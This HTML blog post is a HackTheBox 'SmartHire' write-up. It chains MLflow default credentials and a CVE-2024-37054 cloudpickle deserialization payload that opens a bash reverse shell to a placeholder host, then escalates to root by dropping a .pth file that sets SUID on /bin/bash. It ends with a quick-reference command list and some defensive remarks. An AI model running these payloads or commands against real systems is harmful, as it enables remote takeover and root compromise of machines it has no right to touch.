@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: SmartHire — S. Markakis</title>
+<meta name="description" content="HackTheBox SmartHire — an MLOps box: a hidden models. subdomain runs MLflow 2.14.1 with default admin:password, CVE-2024-37054 turns a trained model into a cloudpickle deserialization RCE for a shell as svcweb, and a NOPASSWD sudo rule on mlflowctl.py is escalated to root via a group-writable plugins/dev directory where a dropped .pth file executes at interpreter startup.">
+<meta property="og:title" content="HTB: SmartHire — S. Markakis">
+<meta property="og:description" content="HackTheBox SmartHire — MLflow default creds → CVE-2024-37054 cloudpickle deserialization RCE → svcweb → NOPASSWD sudo + a group-writable plugins dir where a .pth file runs as root.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-smarthire.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-smarthire.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-smarthire.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-smarthire.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: SmartHire",
+  "description": "HackTheBox SmartHire — an MLOps box: a hidden models. subdomain runs MLflow 2.14.1 with default admin:password, CVE-2024-37054 turns a trained model into a cloudpickle deserialization RCE for a shell as svcweb, and a NOPASSWD sudo rule on mlflowctl.py is escalated to root via a group-writable plugins/dev directory where a dropped .pth file executes at interpreter startup.",
+  "datePublished": "2026-09-11",
+  "dateModified": "2026-09-11",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-smarthire.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-smarthire.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-smarthire"
+  },
+  "timeRequired": "PT6M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+
+  <div class="post-header">
+    <h1>HTB: SmartHire</h1>
+    <div class="post-meta">
+      <span class="date">September 11, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">MLOps</span>
+      <span class="tag">Medium</span>
+      <span>&nbsp;6 min read</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    SmartHire is an MLOps box, and both halves punish trusting inputs you shouldn't. A vhost scan turns up a <strong>models.</strong> subdomain running <strong>MLflow 2.14.1</strong> with the default <code>admin:password</code>. From there, <strong>CVE-2024-37054</strong> weaponises MLflow's own model format: models are stored as Python pickles, so you register a model, overwrite its <code>python_model.pkl</code> with a malicious <strong>cloudpickle</strong>, and the moment the app runs a prediction the pickle deserialises and executes — a shell as <code>svcweb</code>. Root is a smaller, sharper trap: <code>svcweb</code> can <code>sudo</code> a root-run management script, and the plugins directory that script loads is group-writable. Drop a <code>.pth</code> file there and Python runs it as root at interpreter startup, before the script does anything at all.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">vhost: models.smarthire.htb</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">MLflow default creds</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">CVE-2024-37054 pickle RCE</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">svcweb</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">sudo mlflowctl.py + writable plugins/dev</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">.pth → root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <p>SSH and an nginx front end. The web root redirects to <code>smarthire.htb</code> — a hiring-portal app — so the interesting surface is likely elsewhere on the vhost.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -p- --min-rate 1600 -sVC -Pn --open &lt;TARGET&gt;</span>
+<span class="po">22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
+80/tcp open  http  nginx 1.18.0 (Ubuntu)   (→ smarthire.htb)</span></div>
+  </div>
+
+  <p>Fuzz for vhosts. A <code>models.</code> subdomain shows up — and a quick look says it's <strong>MLflow</strong>, the model-registry/experiment-tracking server.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">vhost fuzzing</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">ffuf -u http://smarthire.htb/ -H "Host: FUZZ.smarthire.htb" \
+     -w subdomains-top1million-20000.txt -t 160 -fc 302</span>
+<span class="pg">models                  [Status: 200]</span>
+<span class="pd">$ </span><span class="pc">curl -s http://models.smarthire.htb/ -o /dev/null -w '%{http_code}\n'</span>
+<span class="po">401   </span><span class="pco"># HTTP basic auth in front of MLflow</span></div>
+  </div>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Foothold — MLflow default creds → CVE-2024-37054</h2>
+
+  <p>The basic-auth prompt folds instantly to <code>admin:password</code>, and the API confirms <strong>MLflow 2.14.1</strong>. That version is vulnerable to <strong>CVE-2024-37054</strong>, a deserialization RCE. The root cause is structural: MLflow persists <code>pyfunc</code> models as Python <strong>pickles</strong> (<code>python_model.pkl</code>), and loading a model unpickles that file. Anyone who can write a model's artifacts can therefore choose what code runs when the model is loaded.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">MLflow — default creds</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s -u admin:password \
+     'http://models.smarthire.htb/ajax-api/2.0/mlflow/registered-models/search'</span>
+<span class="pg">200 OK   </span><span class="pco"># authenticated to MLflow 2.14.1</span></div>
+  </div>
+
+  <p>The SmartHire app itself is the delivery vehicle. <a href="https://github.com/jimmexploit/CVE-2024-37054-PoC">jimmexploit's PoC</a> automates the whole loop: register an account on <code>smarthire.htb</code>, upload a CSV to train a model (which creates a registered model + run in MLflow), then <code>PUT</code> a malicious <code>python_model.pkl</code> over the trained one and hit the app's <code>/predict</code> so the poisoned model is loaded. The payload is a <code>cloudpickle</code> object whose <code>__reduce__</code> returns <code>os.system(&lt;reverse shell&gt;)</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">the payload (cloudpickle __reduce__)</span>
+    </div>
+    <div class="term-body"><span class="po">cmd = "bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1'"
+class Exploit:
+    def __reduce__(self):
+        return (os.system, (cmd,))       </span><span class="pco"># runs on unpickle</span><span class="po">
+pkl = cloudpickle.dumps(Exploit())       </span><span class="pco"># PUT as model/python_model.pkl</span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">CVE-2024-37054 → shell</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 shell.py --lhost &lt;LHOST&gt; --lport 4444 --atoz</span>
+<span class="po">[+] Registration successful!   [+] Login successful!
+[+] Model name: ...-model       [+] run_id: 7ccc3540...
+[+] Payload size: 89 bytes      [+] Upload successful!
+[*] Triggering /predict to execute payload...
+[*] Response: 500 {"message":"'int' object has no attribute 'load_context'"}</span></div>
+  </div>
+
+  <div class="alert alert-info">That <code>500</code> looks like a failure but it's the tell that it worked: the pickle is deserialised <em>before</em> MLflow tries to use it as a model, so <code>os.system</code> fires during unpickling and the reverse shell is already live — MLflow only errors afterwards, when it finds our object isn't a real model. Ignore the 500 and check your listener.</div>
+
+  <p>Shell as <code>svcweb</code>, and the user flag is right there. Worth noting the group memberships — they matter for root:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">svcweb → user.txt</span>
+    </div>
+    <div class="term-body"><span class="pu">svcweb</span><span class="ps">@</span><span class="ph">smarthire</span><span class="ps">:~$ </span><span class="pc">id</span>
+<span class="po">uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),</span><span class="pg">1002(devs)</span>
+<span class="pu">svcweb</span><span class="ps">@</span><span class="ph">smarthire</span><span class="ps">:~$ </span><span class="pc">cat ~/user.txt</span>
+<span class="pg">[redacted — user flag]</span></div>
+  </div>
+
+  <!-- ══ PRIVESC ══ -->
+  <h2>Root — a .pth file in a writable plugins dir</h2>
+
+  <p><code>sudo -l</code> shows one rule, and it's a wildcard on a root-run Python script:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">sudo -l</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">sudo -l</span>
+<span class="po">User svcweb may run the following commands on smarthire:
+    (root) NOPASSWD: </span><span class="pr">/usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *</span></div>
+  </div>
+
+  <p>The obvious move is argument injection through that <code>*</code>, but the cleaner path is the script's plugin loader. <code>mlflowctl.py</code> registers its plugin directory as a <em>site directory</em> (<code>site.addsitedir('/opt/tools/mlflow_ctl/plugins/dev')</code>), and — crucially — that directory is group-writable by <code>devs</code>, which <code>svcweb</code> is in:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">the writable plugin dir</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">ls -la /opt/tools/mlflow_ctl/plugins/dev/</span>
+<span class="po">drwx</span><span class="pg">rwx</span><span class="po">r-x 2 root </span><span class="pg">devs</span><span class="po"> 4096 .</span></div>
+  </div>
+
+  <p>Here's the trick. When Python processes a site directory, it reads every <code>.pth</code> file in it — and <strong>any line beginning with <code>import</code> is executed</strong> as code, at interpreter startup, before <code>main()</code> runs. So a one-line <code>.pth</code> dropped by <code>svcweb</code> runs as root the instant the sudo'd <code>python3.10</code> starts up:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">.pth hijack → SUID bash → root</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">echo 'import os; os.system("chmod +s /bin/bash")' \
+     &gt; /opt/tools/mlflow_ctl/plugins/dev/pwn.pth</span>
+<span class="pd">$ </span><span class="pc">sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status</span>
+<span class="po">[+] MLflow service status: active            </span><span class="pco"># .pth already ran as root</span><span class="po"></span>
+<span class="pd">$ </span><span class="pc">ls -l /bin/bash</span>
+<span class="po">-rws</span><span class="pg">r-sr-x</span><span class="po"> 1 root root 1396520 /bin/bash</span>
+<span class="pd">$ </span><span class="pc">/bin/bash -p -c 'id; cat /root/root.txt'</span>
+<span class="po">uid=1000(svcweb) </span><span class="pg">euid=0(root)</span><span class="po"> groups=0(root),1000(svcweb),...
+</span><span class="pg">[redacted — root flag]</span></div>
+  </div>
+
+  <div class="alert alert-success">Two ingredients had to line up: a NOPASSWD sudo rule on an interpreter, and a plugin directory that trusts group members to write code into a root process. Either alone is survivable; together they're a one-line root. If a program must run privileged, nothing on its import/site path — plugins included — should be writable by a less-trusted group, and <code>sudo</code> should point at a fixed, locked-down entry point, never an interpreter with a wildcard.</div>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Why it worked</h2>
+
+  <table class="st">
+    <tr><td>→ svcweb</td><td>MLflow exposed with default <code>admin:password</code> + models stored as pickles → CVE-2024-37054 deserialization RCE (CWE-502 / CWE-1188)</td></tr>
+    <tr><td>→ root</td><td>NOPASSWD sudo on <code>python3.10 &lt;script&gt;</code> whose <code>site.addsitedir</code> plugin dir is group-writable; Python executes <code>.pth</code> <code>import</code> lines at startup (CWE-426 / CWE-732)</td></tr>
+  </table>
+
+  <h2>Key commands</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. recon → MLflow vhost</span>
+<span class="pc">ffuf -u http://smarthire.htb/ -H "Host: FUZZ.smarthire.htb" -w subdomains-20000.txt -fc 302</span>
+<span class="pc">curl -su admin:password http://models.smarthire.htb/ajax-api/2.0/mlflow/registered-models/search</span>
+
+<span class="pco"># 2. CVE-2024-37054 pickle RCE → svcweb (user.txt)</span>
+<span class="pc">python3 shell.py --lhost &lt;LHOST&gt; --lport 4444 --atoz     # register + train + poison + /predict</span>
+<span class="pc">nc -lvnp 4444                                            # catch the shell</span>
+
+<span class="pco"># 3. .pth path hijack → root (root.txt)</span>
+<span class="pc">echo 'import os; os.system("chmod +s /bin/bash")' &gt; /opt/tools/mlflow_ctl/plugins/dev/pwn.pth</span>
+<span class="pc">sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status</span>
+<span class="pc">/bin/bash -p -c 'cat /root/root.txt'</span></div>
+  </div>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
